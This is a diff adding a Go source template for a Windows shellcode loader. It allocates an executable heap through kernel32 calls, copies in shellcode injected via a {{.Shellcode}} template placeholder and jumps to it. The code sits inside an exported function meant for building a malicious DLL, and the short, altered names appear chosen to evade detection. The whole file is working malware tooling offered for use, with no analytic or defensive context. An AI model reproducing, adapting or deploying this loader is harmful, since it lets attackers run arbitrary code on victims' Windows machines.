@@ -1,0 +1,32 @@
+package main
+
+import (
+	"syscall"
+	"unsafe"
+
+	"C"
+
+	"golang.org/x/sys/windows"
+)
+
+func h(s []byte) {
+	k32 := windows.NewLazyDLL("kernel32.dll")
+	hpCr8 := k32.NewProc("HeapCreate")
+	hpAllc := k32.NewProc("HeapAlloc")
+	rmm := k32.NewProc("RtlMoveMemory")
+
+	size := uintptr(len(s))
+	cr8, _, _ := hpCr8.Call(0x00040000, size, size)
+	alloc, _, _ := hpAllc.Call(cr8, 0x00000008, size)
+	rmm.Call(alloc, (uintptr)(unsafe.Pointer(&s[0])), size)
+	syscall.Syscall(alloc, 0, 0, 0, 0)
+
+}
+//export {{.ExportName}}
+func {{.ExportName}}() {
+    var a = []byte{ {{.Shellcode}} }
+    h(a)
+}
+
+func main() {
+}
